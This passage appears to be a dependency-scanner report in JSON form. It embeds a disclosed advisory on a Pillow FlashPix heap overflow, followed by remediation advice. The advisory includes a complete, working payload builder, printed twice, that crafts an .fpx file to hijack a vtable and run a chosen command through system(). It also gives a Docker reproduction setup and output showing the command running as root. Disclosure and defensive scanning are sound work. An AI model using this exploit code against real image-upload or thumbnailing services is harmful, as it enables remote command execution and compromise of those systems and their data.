range(fsec): fat[s] = FATSECT\n    def chain(a, n):\n        for j in range(n): fat[a + j] = a + j + 1 if j \u003c n - 1 else ENDOFCHAIN\n    chain(dstart, dsec)\n    for k in order: chain(pos[k], ns(sd[k]))\n    def de(nm, t, ch, l, r, st, sz, cl=b\"\\x00\" * 16):\n        n = (nm.encode(\"utf-16-le\") + b\"\\x00\\x00\").ljust(64, b\"\\x00\")[:64]\n        return (n + struct.pack(\"\u003cHBB\", min((len(nm) + 1) * 2, 64), t, 1) + o32(l) + o32(r)\n                + o32(ch) + cl + o32(0) + b\"\\x00\" * 16 + o32(st) + struct.pack(\"\u003cQ\", sz))\n    directory = pad(b\"\".join([\n        de(\"Root Entry\", 5, 1, NOSTREAM, NOSTREAM, ENDOFCHAIN, 0, FPX_CLSID),\n        de(\"Data Object Store 000001\", 1, 2, NOSTREAM, NOSTREAM, ENDOFCHAIN, 0),\n        de(\"\\x05Image Contents\", 2, NOSTREAM, NOSTREAM, 3, pos[\"ic\"], len(sd[\"ic\"])),\n        de(RESNAME, 1, 4, NOSTREAM, NOSTREAM, ENDOFCHAIN, 0),\n        de(\"Subimage 0000 Data\", 2, NOSTREAM, NOSTREAM, 5, pos[\"dat\"], len(sd[\"dat\"])),\n        de(\"Subimage 0000 Header\", 2, NOSTREAM, NOSTREAM, NOSTREAM, pos[\"hdr\"], len(sd[\"hdr\"]))]))\n    h = bytearray(512); h[0:8] = bytes.fromhex(\"D0CF11E0A1B11AE1\")\n    for o, fmt, *v in [(24, \"\u003cHH\", 0x3E, 3), (28, \"\u003cH\", 0xFFFE), (30, \"\u003cHH\", 9, 6), (44, \"\u003cI\", fsec),\n                       (48, \"\u003cI\", dstart), (56, \"\u003cI\", 4096), (60, \"\u003cI\", ENDOFCHAIN), (68, \"\u003cI\", ENDOFCHAIN)]:\n        struct.pack_into(fmt, h, o, *v)\n    for i in range(109): struct.pack_into(\"\u003cI\", h, 76 + i * 4, i if i \u003c fsec else FREESECT)\n    secs = [b\"\"] * total\n    for s in range(fsec): secs[s] = b\"\".join(o32(x) for x in fat[s * 128:(s + 1) * 128])\n    for j in range(dsec): secs[dstart + j] = directory[j * SECT:(j + 1) * SECT]\n    for k in order:\n        for j in range(ns(sd[k])): secs[pos[k] + j] = sd[k][j * SECT:(j + 1) * SECT]\n    open(out, \"wb\").write(bytes(h) + b\"\".join(secs))\n\ndef xhex(s): return int(s, 16)\n\nSYSTEM_PLT = 0x4206c0   # system@plt in the image's non-PIE python3.12 (fixed, no libc leak)\n\ndef main():\n    ap = argparse.ArgumentParser(description=\"F-JPEG-1 .fpx payload builder (0-ASLR box)\")\n    ap.add_argument(\"--out\", required=True, help=\"output .fpx path\")\n    ap.add_argument(\"--crash\", action=\"store_true\",\n                    help=\"crash mode: flood an adjacent ob_type with 0x42.. and SIGSEGV (no addresses)\")\n    ap.add_argument(\"--heap-base\", type=xhex, default=0xbaa000,\n                    help=\"fixed heap base of the 0-ASLR box (default 0xbaa000)\")\n    ap.add_argument(\"--offset\", type=xhex, default=0x21e800,\n                    help=\"state-\u003ebuffer - heap_base (default 0x21e800 -\u003e S=0xdc8800)\")\n    ap.add_argument(\"--target\", type=xhex, default=SENTINEL,\n                    help=\"value called via the hijacked vtable; pass %#x (system@plt) for \"\n                         \"command execution (default is a sentinel for an RIP-control demo)\" % SYSTEM_PLT)\n    ap.add_argument(\"--cmd\", default=\"id\",\n                    help=\"command system() runs, written inline at obj+0 / rdi (\u003c=7 bytes, e.g. id, id;w)\")\n    a = ap.parse_args()\n\n    if a.crash:\n        # Pillow's CMYK JPEG path decodes inverted (decoded = 255 - src), so flood source 0xBD\n        # to make the decoded overflow bytes 0x42 -\u003e the adjacent ob_type becomes 0x4242424242424242.\n        build_fpx(jpeg(bytes([0xBD]) * (W * H * 4)), a.out)\n        print(\"[crash] %s: opening it overwrites an adjacent ob_type with 0x4242424242424242 \"\n              \"-\u003e SIGSEGV in PyBuffer_Release (no addresses)\" % a.out)\n        return\n\n    if len(a.cmd.encode()) \u003e 7:\n        sys.exit(\"--cmd must be \u003c=7 bytes (it is written inline at obj+0, before ob_type)\")\n    S = a.heap_base + a.offset\n    A0, A1, B0, B1 = 0x2000, 0xA000, 0x100, 0x2000     # spray A = fake type, spray B = TARGET\n    tg = [(OB_TYPE_OFF, p64(S + (A0 + A1) // 2)),\n          (OB_TYPE_OFF - 8, a.cmd.encode() + b\"\\x00\")]      # obj+0 -\u003e rdi for system()\n    tg += [(o, p64(S + 0x100)) for o in range(A0, A1, 8)]   # fake type -\u003e spray B at +0xa0..+8\n    tg += [(o, p64(a.target)) for o in range(B0, B1, 8)]\n    jpg, it, bad = craft(tg)\n    build_fpx(jpg, a.out)\n    print(\"[control] %s: S=%#x target=%#x cmd=%r craft_iters=%d bad=%d\"\n          % (a.out, S, a.target, a.cmd, it, bad))\n    print(\"[control] opening it: vtable hijack -\u003e call *%#x with rdi -\u003e %r\" % (a.target, a.cmd))\n\nif __name__ == \"__main__\":\n    main()\n```"
              },
              "help": {
                "markdown": "**Your dependency is vulnerable to [CVE-2026-112398](https://osv.dev/CVE-2026-112398)**.\n\n## [GHSA-5x8w-8jj5-q52h](https://osv.dev/GHSA-5x8w-8jj5-q52h)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ### Credits\n\u003e \n\u003e **Researcher**: Alex Bouffard (mixbo@pebwalker.com)\n\u003e \n\u003e ### Summary\n\u003e \n\u003e A heap buffer overflow in Pillow's FlashPix (FPX) JPEG-tile decoder lets an attacker achieve arbitrary code execution by getting an application to open a single crafted file with `Image.open()`. The file is recognized by content (the OLE2 magic), not by extension, so any service that opens or thumbnails untrusted uploads with the optional `olefile` dependency installed is reachable with no user interaction. In the PoC below, opening one crafted file executes an attacker-chosen command on stock Pillow 12.2.0 (x86_64 Ubuntu 24.04, glibc 2.39).\n\u003e \n\u003e ### Details\n\u003e \n\u003e `FpxImagePlugin` decodes FlashPix (FPX) files, which are OLE2/CFBF compound documents.\n\u003e \n\u003e `Image.open()` auto-detects them from the OLE2 magic `D0CF11E0...` whenever the optional `olefile` package is installed (Pillow's documented dependency for FPX/MIC support), regardless of the file's extension.\n\u003e \n\u003e For a JPEG-compressed subimage (`compression == 2`), the plugin builds a `\"jpeg\"` decode tile and derives the `(rawmode, jpegmode)` pair from attacker-controlled FPX color IDs through the `MODES` table ([`src/PIL/FpxImagePlugin.py` L25-L32](https://github.com/python-pillow/Pillow/blob/12.2.0/src/PIL/FpxImagePlugin.py#L25-L32)):\n\u003e \n\u003e ```python\n\u003e MODES = {\n\u003e     ...\n\u003e     (0x00018000, 0x00017FFE): (\"RGBA\", \"LA\"),                # rawmode \"LA\"  (2 bytes/pixel)\n\u003e     ...\n\u003e     (0x00020000, 0x00020001, 0x00020002): (\"RGB\", \"YCC;P\"),  # rawmode \"YCC;P\"\n\u003e }\n\u003e ```\n\u003e \n\u003e The Imaging output buffer for the tile is sized for the rawmode (here `\"LA\"` = 2 bytes/pixel) ([`src/decode.c` L223-L226](https://github.com/python-pillow/Pillow/blob/12.2.0/src/decode.c#L223-L226)):\n\u003e \n\u003e ```c\n\u003e state-\u003ebytes = (state-\u003ebits * state-\u003exsize + 7) / 8;   // \"LA\" gives 2 * xsize bytes/row\n\u003e ...\n\u003e state-\u003ebuffer = (UINT8 *)calloc(1, state-\u003ebytes);\n\u003e ```\n\u003e \n\u003e In `JpegDecode.c` the rawmode string is mapped to a libjpeg `out_color_space`. Recognized modes (`CMYK`, `YCbCr`, `YCbCrK`, and so on) get a concrete colorspace, but `\"LA\"` and `\"YCC;P\"` are not recognized, so control reaches the fallback branch ([`src/libImaging/JpegDecode.c` L219-L221](https://github.com/python-pillow/Pillow/blob/12.2.0/src/libImaging/JpegDecode.c#L219-L221)):\n\u003e \n\u003e ```c\n\u003e /* Disable decoder conversions. */\n\u003e context-\u003ecinfo.jpeg_color_space = JCS_UNKNOWN;\n\u003e context-\u003ecinfo.out_color_space  = JCS_UNKNOWN;\n\u003e ```\n\u003e \n\u003e Under `JCS_UNKNOWN`, libjpeg performs no color conversion and emits `cinfo.num_components` bytes per pixel, taken from the embedded JPEG's SOF marker, which the attacker sets to 4. So `jpeg_read_scanlines` writes `4 * width` bytes per row into a buffer allocated for only `2 * width` bytes ([`src/libImaging/JpegDecode.c` L252](https://github.com/python-pillow/Pillow/blob/12.2.0/src/libImaging/JpegDecode.c#L252)):\n\u003e \n\u003e ```c\n\u003e ok = jpeg_read_scanlines(\u0026context-\u003ecinfo, \u0026state-\u003ebuffer, 1);   // writes 4*W into a 2*W buffer\n\u003e ```\n\u003e \n\u003e This is a heap out-of-bounds write with attacker-controlled length (the image width, up to tens of thousands of pixels, so about `2 * width` bytes of overflow per row) and attacker-controlled content (the decoded pixel data). The PoC weaponizes it: the overflow overwrites an adjacent Python `bytes` object's `ob_type` with a pointer to a fake `PyTypeObject` / `PyBufferProcs` vtable that the same overflow plants inside the decode buffer. When Pillow releases the input buffer, `PyBuffer_Release` walks `ob_type -\u003e tp_as_buffer -\u003e bf_releasebuffer` and executes `call *rax`; the PoC points that at `system@plt` (fixed, the interpreter binary is non-PIE) with `rdi` set to the command string, yielding command execution.\n\u003e \n\u003e ### PoC\n\u003e \n\u003e To facilitate an exact reproduction on an x86_64 machine, this PoC uses the version-pinned, ASLR-disabled Docker image from [Annex A](#annex-a-docker-setup).\n\u003e \n\u003e The source code for the payload builder `make_payload.py` is in [Annex B](#annex-b-payload-builder-source).\n\u003e \n\u003e `vulnerable.py` is the program under test, a one-liner that opens the file it is given:\n\u003e \n\u003e ```python\n\u003e #!/usr/bin/env python3\n\u003e # The entire vulnerable operation an application performs on an untrusted file.\n\u003e import sys\n\u003e from PIL import Image\n\u003e \n\u003e Image.open(sys.argv[1]).load()\n\u003e ```\n\u003e \n\u003e The payload is a standalone `.fpx` file the attacker crafts on their own host; the target only ever opens the resulting file, so building it requires no access to or code execution on the target. We run `make_payload.py` inside the same container here purely for convenience, so its baked-in addresses (`--offset`, `system@plt`) match this pinned image. The payload redirects the hijacked indirect call to `system@plt` (`0x4206c0`, fixed because the interpreter binary is non-PIE) with a baked-in command:\n\u003e \n\u003e ```console\n\u003e $ python3 make_payload.py --target 0x4206c0 --cmd id --out shell.fpx\n\u003e [control] shell.fpx: S=0xdc8800 target=0x4206c0 cmd='id' craft_iters=0 bad=0\n\u003e [control] opening it: vtable hijack -\u003e call *0x4206c0 with rdi -\u003e 'id'\n\u003e ```\n\u003e \n\u003e Then open it with `vulnerable.py`:\n\u003e \n\u003e ```console\n\u003e $ python3 vulnerable.py shell.fpx\n\u003e uid=0(root) gid=0(root) groups=0(root)\n\u003e corrupted size vs. prev_size\n\u003e ```\n\u003e \n\u003e `Image.open()` of the crafted file runs the baked command via `system(\"id\")`: command execution as the user running the image processing (root in the container).\n\u003e \n\u003e The trailing `corrupted size vs. prev_size` is glibc aborting during interpreter teardown over the corrupted heap, after `id` has\n\u003e already run.\n\u003e \n\u003e The builder writes the command inline at the hijacked `rdi`, so `--cmd` is limited to 7 bytes (for example `id`, `id;w`). `--offset` and `system@plt` are constants of the pinned, ASLR-disabled image and hold across runs of it.\n\u003e \n\u003e ### Impact\n\u003e \n\u003e This is a heap-based buffer overflow (CWE-122) / out-of-bounds write (CWE-787) that leads to code execution. Any application or service that opens attacker-influenced files with Pillow and has the optional `olefile` dependency installed is affected: image upload and thumbnailing services, avatar and media processing, document and image conversion pipelines, and similar. Because detection is by OLE2 magic rather than file extension and the overflow is triggered during a normal `Image.open()` / `load`, a server that automatically processes an uploaded file is exploitable with no user interaction. The result is arbitrary command execution in the context of the process performing the image processing, leading to full compromise of that process and the data and privileges it holds.\n\u003e \n\u003e ### Annex A: Docker setup\n\u003e \n\u003e The PoC runs in a pinned Docker image so the environment is deterministic; the image installs a version-pinned Python (3.12.3) and the Pillow 12.2.0 wheel, and the builder is pure Pillow. The image's entrypoint disables ASLR (`setarch -R`) to reduce the system knowledge requirements. The single `--security-opt seccomp=unconfined` flag on `docker run` is required only because turning ASLR off uses the `personality()` syscall that Docker's default seccomp profile blocks. Run only on infrastructure you own.\n\u003e \n\u003e **1. Build the image.** Put `vulnerable.py` (PoC) and `make_payload.py`\n\u003e ([Annex B](#annex-b-payload-builder-source)) in a directory with this `Dockerfile`:\n\u003e \n\u003e ```dockerfile\n\u003e FROM ubuntu:24.04@sha256:786a8b558f7be160c6c8c4a54f9a57274f3b4fb1491cf65146521ae77ff1dc54\n\u003e RUN apt-get update \u0026\u0026 apt-get install -y --no-install-recommends \\\n\u003e         ca-certificates \\\n\u003e         python3.12=3.12.3-1ubuntu0.13 python3.12-venv=3.12.3-1ubuntu0.13 \\\n\u003e     \u0026\u0026 rm -rf /var/lib/apt/lists/*\n\u003e RUN python3.12 -m venv /opt/v \\\n\u003e     \u0026\u0026 /opt/v/bin/pip install --no-cache-dir \"Pillow==12.2.0\" \"olefile==0.47\"\n\u003e ENV PATH=/opt/v/bin:$PATH\n\u003e WORKDIR /poc\n\u003e # ASLR is an OS mitigation unrelated to the bug; disable it in-image for a deterministic heap.\n\u003e ENTRYPOINT [\"setarch\", \"-R\"]\n\u003e CMD [\"bash\"]\n\u003e ```\n\u003e \n\u003e ```console\n\u003e $ docker build -t fjpeg1-poc .\n\u003e ...\n\u003e Downloading pillow-12.2.0-cp312-cp312-manylinux_2_27_x86_64.manylinux_2_28_x86_64.whl (7.1 MB)\n\u003e Successfully installed Pillow-12.2.0 olefile-0.47\n\u003e Successfully built 370344c832b6\n\u003e Successfully tagged fjpeg1-poc:latest\n\u003e ```\n\u003e \n\u003e **2. Start the (ASLR-disabled) container shell** with the scripts mounted:\n\u003e \n\u003e ```sh\n\u003e docker run --rm -it --security-opt seccomp=unconfined -v \"$PWD:/poc\" -w /poc fjpeg1-poc\n\u003e ```\n\u003e \n\u003e ### Annex B: payload builder source\n\u003e \n\u003e `make_payload.py`:\n\u003e \n\u003e ```python\n\u003e #!/usr/bin/env python3\n\u003e \"\"\"F-JPEG-1 payload builder for a 0-ASLR box (x86_64 + glibc), pure Pillow (no native toolchain).\n\u003e Builds an .fpx whose embedded 4-component JPEG, decoded via Pillow's FpxImagePlugin -\u003e JCS_UNKNOWN\n\u003e path, overflows the 2-byte/px decode buffer and overwrites an adjacent object's ob_type.\n\u003e   --crash      flood an adjacent ob_type with 0x42.. -\u003e SIGSEGV in PyBuffer_Release\n\u003e   (default)    CONTROL: fake vtable at the fixed (no-ASLR) addresses -\u003e call *--target\n\u003e Defaults target the pinned Docker image with ASLR disabled (setarch -R). See --help.\"\"\"\n\u003e import sys, io, struct, math, argparse\n\u003e from PIL import Image\n\u003e \n\u003e W, H = 65000, 2\n\u003e SECT, OB_TYPE_OFF, DATA_PAD, SENTINEL = 512, 130024, 0x18000, 0x4142434445464748\n\u003e FREESECT, ENDOFCHAIN, FATSECT, NOSTREAM = 0xFFFFFFFF, 0xFFFFFFFE, 0xFFFFFFFD, 0xFFFFFFFF\n\u003e FPX_CLSID = bytes.fromhex(\"0067615654C1CE11855300AA00A1F95B\")\n\u003e o32 = lambda v: struct.pack(\"\u003cI\", v)\n\u003e p64 = lambda v: struct.pack(\"\u003cQ\", v)\n\u003e INV = bytes(255 - i for i in range(256))   # 8-bit inversion table\n\u003e \n\u003e def jpeg(src):\n\u003e     b = io.BytesIO()\n\u003e     Image.frombytes(\"CMYK\", (W, H), bytes(src)).save(b, \"JPEG\", quality=100, subsampling=0)\n\u003e     return b.getvalue()\n\u003e \n\u003e def decode_row(jpg):\n\u003e     # Predict what the vulnerable JCS_UNKNOWN path decodes, using Pillow itself: JCS_UNKNOWN emits\n\u003e     # the raw JPEG components R, while Pillow's own CMYK decode of the same file returns 255 - R\n\u003e     # (the Adobe-CMYK inversion). So 255 - Image.open(jpg) is exactly the vulnerable output. The\n\u003e     # last decoded row is the one that lands in (and overflows past) the buffer.\n\u003e     px = Image.open(io.BytesIO(jpg)).tobytes()\n\u003e     return px[(H - 1) * W * 4:].translate(INV)\n\u003e \n\u003e def craft(targets, iters=40):  # decode-feedback exact write (JPEG is lossy -\u003e iterate to converge)\n\u003e     # base fill 0xBD -\u003e decodes to 0x42, so the overflow GAPS match the crash-mode flood pattern\n\u003e     # that reaches PyBuffer_Release cleanly (uniform 0x42 avoids a premature glibc free() abort).\n\u003e     src = bytearray(b\"\\xbd\" * (W * H * 4)); base = (H - 1) * W * 4; it = 0\n\u003e     for off, t in targets:\n\u003e         for i, v in enumerate(t): src[base + off + i] = src[off + i] = 255 - v\n\u003e     for it in range(iters):\n\u003e         dec = decode_row(jpeg(src)); bad = 0\n\u003e         for off, t in targets:\n\u003e             for i, v in enumerate(t):\n\u003e                 if dec[off + i] != v:\n\u003e                     bad += 1\n\u003e                     src[base + off + i] = src[off + i] = max(0, min(255, src[base + off + i] + dec[off + i] - v))\n\u003e         if not bad: break\n\u003e     return jpeg(src), it, bad\n\u003e \n\u003e def maxid_for(w, h):\n\u003e     s, i = max(w, h), 1\n\u003e     while s \u003e 64: s //= 2; i += 1\n\u003e     return i - 1\n\u003e MAXID = maxid_for(W, H); RESNAME = \"Resolution %04d\" % MAXID\n\u003e \n\u003e def image_contents():\n\u003e     ui4 = lambda v: o32(19) + o32(v); blob = lambda b: o32(65) + o32(len(b)) + b\n\u003e     cb = o32(1) + o32(2) + o32(0x00018000) + o32(0x00017FFE)        # FPX color -\u003e rawmode \"LA\"\n\u003e     props = [(0x1000002, ui4(W)), (0x1000003, ui4(H)), (0x2000002 | (MAXID \u003c\u003c 16), blob(cb))]\n\u003e     voff = 8 + 8 * len(props); idx = vals = b\"\"\n\u003e     for pid, v in props: idx += o32(pid) + o32(voff); vals += v; voff += len(v)\n\u003e     body = o32(len(props)) + idx + vals\n\u003e     return (struct.pack(\"\u003cHHI\", 0xFFFE, 0, 0x00020005) + b\"\\x00\" * 16 + o32(1) + b\"\\x00\" * 16\n\u003e             + o32(48) + o32(len(body) + 4) + body)\n\u003e \n\u003e def subimage_header():\n\u003e     b = bytearray(80)\n\u003e     for o, v in [(32, W), (36, H), (40, 1), (44, max(W, 256)), (48, max(H, 256)), (52, 2),\n\u003e                  (56, 36), (60, 16), (64, 0), (72, 2)]:\n\u003e         struct.pack_into(\"\u003cI\", b, o, v)\n\u003e     return bytes(b)\n\u003e \n\u003e def build_fpx(jpg, out):\n\u003e     data = b\"\\x00\" * 28 + jpg\n\u003e     assert len(data) \u003c= DATA_PAD, (len(data), DATA_PAD)\n\u003e     pad = lambda x: x + b\"\\x00\" * ((-len(x)) % SECT)\n\u003e     sd = {\"ic\": pad(image_contents().ljust(4096, b\"\\x00\")),\n\u003e           \"hdr\": pad(subimage_header().ljust(4096, b\"\\x00\")),\n\u003e           \"dat\": pad(data.ljust(DATA_PAD, b\"\\x00\"))}\n\u003e     ns = lambda x: len(x) // SECT; order = [\"ic\", \"dat\", \"hdr\"]\n\u003e     dsec = math.ceil(6 * 128 / SECT); content = dsec + sum(ns(sd[k]) for k in order)\n\u003e     fsec = 1\n\u003e     while fsec * 128 \u003c fsec + content: fsec += 1\n\u003e     pos = {}; cur = fsec; dstart = cur; cur += dsec\n\u003e     for k in order: pos[k] = cur; cur += ns(sd[k])\n\u003e     total = cur\n\u003e     fat = [FREESECT] * (fsec * 128)\n\u003e     for s in range(fsec): fat[s] = FATSECT\n\u003e     def chain(a, n):\n\u003e         for j in range(n): fat[a + j] = a + j + 1 if j \u003c n - 1 else ENDOFCHAIN\n\u003e     chain(dstart, dsec)\n\u003e     for k in order: chain(pos[k], ns(sd[k]))\n\u003e     def de(nm, t, ch, l, r, st, sz, cl=b\"\\x00\" * 16):\n\u003e         n = (nm.encode(\"utf-16-le\") + b\"\\x00\\x00\").ljust(64, b\"\\x00\")[:64]\n\u003e         return (n + struct.pack(\"\u003cHBB\", min((len(nm) + 1) * 2, 64), t, 1) + o32(l) + o32(r)\n\u003e                 + o32(ch) + cl + o32(0) + b\"\\x00\" * 16 + o32(st) + struct.pack(\"\u003cQ\", sz))\n\u003e     directory = pad(b\"\".join([\n\u003e         de(\"Root Entry\", 5, 1, NOSTREAM, NOSTREAM, ENDOFCHAIN, 0, FPX_CLSID),\n\u003e         de(\"Data Object Store 000001\", 1, 2, NOSTREAM, NOSTREAM, ENDOFCHAIN, 0),\n\u003e         de(\"\\x05Image Contents\", 2, NOSTREAM, NOSTREAM, 3, pos[\"ic\"], len(sd[\"ic\"])),\n\u003e         de(RESNAME, 1, 4, NOSTREAM, NOSTREAM, ENDOFCHAIN, 0),\n\u003e         de(\"Subimage 0000 Data\", 2, NOSTREAM, NOSTREAM, 5, pos[\"dat\"], len(sd[\"dat\"])),\n\u003e         de(\"Subimage 0000 Header\", 2, NOSTREAM, NOSTREAM, NOSTREAM, pos[\"hdr\"], len(sd[\"hdr\"]))]))\n\u003e     h = bytearray(512); h[0:8] = bytes.fromhex(\"D0CF11E0A1B11AE1\")\n\u003e     for o, fmt, *v in [(24, \"\u003cHH\", 0x3E, 3), (28, \"\u003cH\", 0xFFFE), (30, \"\u003cHH\", 9, 6), (44, \"\u003cI\", fsec),\n\u003e                        (48, \"\u003cI\", dstart), (56, \"\u003cI\", 4096), (60, \"\u003cI\", ENDOFCHAIN), (68, \"\u003cI\", ENDOFCHAIN)]:\n\u003e         struct.pack_into(fmt, h, o, *v)\n\u003e     for i in range(109): struct.pack_into(\"\u003cI\", h, 76 + i * 4, i if i \u003c fsec else FREESECT)\n\u003e     secs = [b\"\"] * total\n\u003e     for s in range(fsec): secs[s] = b\"\".join(o32(x) for x in fat[s * 128:(s + 1) * 128])\n\u003e     for j in range(dsec): secs[dstart + j] = directory[j * SECT:(j + 1) * SECT]\n\u003e     for k in order:\n\u003e         for j in range(ns(sd[k])): secs[pos[k] + j] = sd[k][j * SECT:(j + 1) * SECT]\n\u003e     open(out, \"wb\").write(bytes(h) + b\"\".join(secs))\n\u003e \n\u003e def xhex(s): return int(s, 16)\n\u003e \n\u003e SYSTEM_PLT = 0x4206c0   # system@plt in the image's non-PIE python3.12 (fixed, no libc leak)\n\u003e \n\u003e def main():\n\u003e     ap = argparse.ArgumentParser(description=\"F-JPEG-1 .fpx payload builder (0-ASLR box)\")\n\u003e     ap.add_argument(\"--out\", required=True, help=\"output .fpx path\")\n\u003e     ap.add_argument(\"--crash\", action=\"store_true\",\n\u003e                     help=\"crash mode: flood an adjacent ob_type with 0x42.. and SIGSEGV (no addresses)\")\n\u003e     ap.add_argument(\"--heap-base\", type=xhex, default=0xbaa000,\n\u003e                     help=\"fixed heap base of the 0-ASLR box (default 0xbaa000)\")\n\u003e     ap.add_argument(\"--offset\", type=xhex, default=0x21e800,\n\u003e                     help=\"state-\u003ebuffer - heap_base (default 0x21e800 -\u003e S=0xdc8800)\")\n\u003e     ap.add_argument(\"--target\", type=xhex, default=SENTINEL,\n\u003e                     help=\"value called via the hijacked vtable; pass %#x (system@plt) for \"\n\u003e                          \"command execution (default is a sentinel for an RIP-control demo)\" % SYSTEM_PLT)\n\u003e     ap.add_argument(\"--cmd\", default=\"id\",\n\u003e                     help=\"command system() runs, written inline at obj+0 / rdi (\u003c=7 bytes, e.g. id, id;w)\")\n\u003e     a = ap.parse_args()\n\u003e \n\u003e     if a.crash:\n\u003e         # Pillow's CMYK JPEG path decodes inverted (decoded = 255 - src), so flood source 0xBD\n\u003e         # to make the decoded overflow bytes 0x42 -\u003e the adjacent ob_type becomes 0x4242424242424242.\n\u003e         build_fpx(jpeg(bytes([0xBD]) * (W * H * 4)), a.out)\n\u003e         print(\"[crash] %s: opening it overwrites an adjacent ob_type with 0x4242424242424242 \"\n\u003e               \"-\u003e SIGSEGV in PyBuffer_Release (no addresses)\" % a.out)\n\u003e         return\n\u003e \n\u003e     if len(a.cmd.encode()) \u003e 7:\n\u003e         sys.exit(\"--cmd must be \u003c=7 bytes (it is written inline at obj+0, before ob_type)\")\n\u003e     S = a.heap_base + a.offset\n\u003e     A0, A1, B0, B1 = 0x2000, 0xA000, 0x100, 0x2000     # spray A = fake type, spray B = TARGET\n\u003e     tg = [(OB_TYPE_OFF, p64(S + (A0 + A1) // 2)),\n\u003e           (OB_TYPE_OFF - 8, a.cmd.encode() + b\"\\x00\")]      # obj+0 -\u003e rdi for system()\n\u003e     tg += [(o, p64(S + 0x100)) for o in range(A0, A1, 8)]   # fake type -\u003e spray B at +0xa0..+8\n\u003e     tg += [(o, p64(a.target)) for o in range(B0, B1, 8)]\n\u003e     jpg, it, bad = craft(tg)\n\u003e     build_fpx(jpg, a.out)\n\u003e     print(\"[control] %s: S=%#x target=%#x cmd=%r craft_iters=%d bad=%d\"\n\u003e           % (a.out, S, a.target, a.cmd, it, bad))\n\u003e     print(\"[control] opening it: vtable hijack -\u003e call *%#x with rdi -\u003e %r\" % (a.target, a.cmd))\n\u003e \n\u003e if __name__ == \"__main__\":\n\u003e     main()\n\u003e ```\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/egolint/uv.lock | pillow | 12.3.0 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-5x8w-8jj5-q52h | pillow | 13.0.0 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-112398\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n",
                "text": "**Your dependency is vulnerable to [CVE-2026-112398](https://osv.dev/CVE-2026-112398)**.\n\n## [GHSA-5x8w-8jj5-q52h](https://osv.dev/GHSA-5x8w-8jj5-q52h)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ### Credits\n\u003e \n\u003e **Researcher**: Alex Bouffard (mixbo@pebwalker.com)\n\u003e \n\u003e ### Summary\n\u003e \n\u003e A heap buffer overflow in Pillow's FlashPix (FPX) JPEG-tile decoder lets an attacker achieve arbitrary code execution by getting an application to open a single crafted file with `Image.open()`. The file is recognized by content (the OLE2 magic), not by extension, so any service that opens or thumbnails untrusted uploads with the optional `olefile` dependency installed is reachable with no user interaction. In the PoC below, opening one crafted file executes an attacker-chosen command on stock Pillow 12.2.0 (x86_64 Ubuntu 24.04, glibc 2.39).\n\u003e \n\u003e ### Details\n\u003e \n\u003e `FpxImagePlugin` decodes FlashPix (FPX) files, which are OLE2/CFBF compound documents.\n\u003e \n\u003e `Image.open()` auto-detects them from the OLE2 magic `D0CF11E0...` whenever the optional `olefile` package is installed (Pillow's documented dependency for FPX/MIC support), regardless of the file's extension.\n\u003e \n\u003e For a JPEG-compressed subimage (`compression == 2`), the plugin builds a `\"jpeg\"` decode tile and derives the `(rawmode, jpegmode)` pair from attacker-controlled FPX color IDs through the `MODES` table ([`src/PIL/FpxImagePlugin.py` L25-L32](https://github.com/python-pillow/Pillow/blob/12.2.0/src/PIL/FpxImagePlugin.py#L25-L32)):\n\u003e \n\u003e ```python\n\u003e MODES = {\n\u003e     ...\n\u003e     (0x00018000, 0x00017FFE): (\"RGBA\", \"LA\"),                # rawmode \"LA\"  (2 bytes/pixel)\n\u003e     ...\n\u003e     (0x00020000, 0x00020001, 0x00020002): (\"RGB\", \"YCC;P\"),  # rawmode \"YCC;P\"\n\u003e }\n\u003e ```\n\u003e \n\u003e The Imaging output buffer for the tile is sized for the rawmode (here `\"LA\"` = 2 bytes/pixel) ([`src/decode.c` L223-L226](https://github.com/python-pillow/Pillow/blob/12.2.0/src/decode.c#L223-L226)):\n\u003e \n\u003e ```c\n\u003e state-\u003ebytes = (state-\u003ebits * state-\u003exsize + 7) / 8;   // \"LA\" gives 2 * xsize bytes/row\n\u003e ...\n\u003e state-\u003ebuffer = (UINT8 *)calloc(1, state-\u003ebytes);\n\u003e ```\n\u003e \n\u003e In `JpegDecode.c` the rawmode string is mapped to a libjpeg `out_color_space`. Recognized modes (`CMYK`, `YCbCr`, `YCbCrK`, and so on) get a concrete colorspace, but `\"LA\"` and `\"YCC;P\"` are not recognized, so control reaches the fallback branch ([`src/libImaging/JpegDecode.c` L219-L221](https://github.com/python-pillow/Pillow/blob/12.2.0/src/libImaging/JpegDecode.c#L219-L221)):\n\u003e \n\u003e ```c\n\u003e /* Disable decoder conversions. */\n\u003e context-\u003ecinfo.jpeg_color_space = JCS_UNKNOWN;\n\u003e context-\u003ecinfo.out_color_space  = JCS_UNKNOWN;\n\u003e ```\n\u003e \n\u003e Under `JCS_UNKNOWN`, libjpeg performs no color conversion and emits `cinfo.num_components` bytes per pixel, taken from the embedded JPEG's SOF marker, which the attacker sets to 4. So `jpeg_read_scanlines` writes `4 * width` bytes per row into a buffer allocated for only `2 * width` bytes ([`src/libImaging/JpegDecode.c` L252](https://github.com/python-pillow/Pillow/blob/12.2.0/src/libImaging/JpegDecode.c#L252)):\n\u003e \n\u003e ```c\n\u003e ok = jpeg_read_scanlines(\u0026context-\u003ecinfo, \u0026state-\u003ebuffer, 1);   // writes 4*W into a 2*W buffer\n\u003e ```\n\u003e \n\u003e This is a heap out-of-bounds write with attacker-controlled length (the image width, up to tens of thousands of pixels, so about `2 * width` bytes of overflow per row) and attacker-controlled content (the decoded pixel data). The PoC weaponizes it: the overflow overwrites an adjacent Python `bytes` object's `ob_type` with a 